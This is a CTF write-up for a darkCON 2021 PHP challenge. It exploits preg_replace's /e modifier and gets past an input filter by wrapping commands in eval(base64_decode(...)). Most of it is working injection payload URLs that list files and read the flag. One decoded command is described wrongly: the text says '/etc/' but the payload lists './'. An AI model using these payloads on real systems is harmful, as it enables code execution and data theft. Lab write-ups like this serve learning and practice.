**Challenge**: http://wtf-php.darkarmy.xyz/

robots.txt: `?lmao=1` (source code)

preg_replace payload: `<command>, /W/e, $text`
- As the content of `$text` variable starts with `Welcome`, we need a regex to select it `/W/e`.

phpinfo: `http://easy-php.darkarmy.xyz/?bruh=phpinfo();&nic3=/W/e`

We must bypass `is_payload_danger` function, which sanitize our input. As the `eval` function is available, we can encode our input in base64 and then execute as `eval(base64_decode(<encoded command>))`.

Directory listing: `http://easy-php.darkarmy.xyz/?bruh=eval(base64_decode(%22cHJpbnRfcihzY2FuZGlyKCIuLyIpKTs=%22));&nic3=/W/e`
    It means: `print_r(scandir("/etc/"));`

Getting the flag: `http://easy-php.darkarmy.xyz/?bruh=eval(base64_decode(%22aGlnaGxpZ2h0X2ZpbGUoImZsYWcyMTBkOWY4OGZkMWRiNzFiOTQ3ZmJkY2UyMjg3MWI1Ny5waHAiKTs=%22));&nic3=/W/e`   It means: `highlight_file("flag210d9f88fd1db71b947fbdce22871b57.php");`

Reference: https://medium.com/@roshancp/command-execution-preg-replace-php-function-exploit-62d6f746bda4

**Flag**: darkCON{w3lc0me_D4rkC0n_CTF_2O21_ggwp!!!!}
